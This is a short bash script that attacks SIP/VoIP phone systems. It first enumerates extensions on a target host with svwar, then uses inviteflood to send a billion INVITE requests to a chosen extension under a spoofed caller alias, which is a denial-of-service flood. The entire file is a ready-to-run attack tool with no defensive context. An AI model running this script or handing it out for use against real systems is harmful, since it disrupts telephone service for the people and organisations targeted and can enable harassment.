#!/bin/bash

if [ $# -eq 4 ]; then
    svwar -D -m INVITE -p $2 $1
    sudo inviteflood $2 $3 $1 $1 -a "$4" 1000000000
else
    echo "Please provide the target host, network interface, internal phone number and an alias."
fi
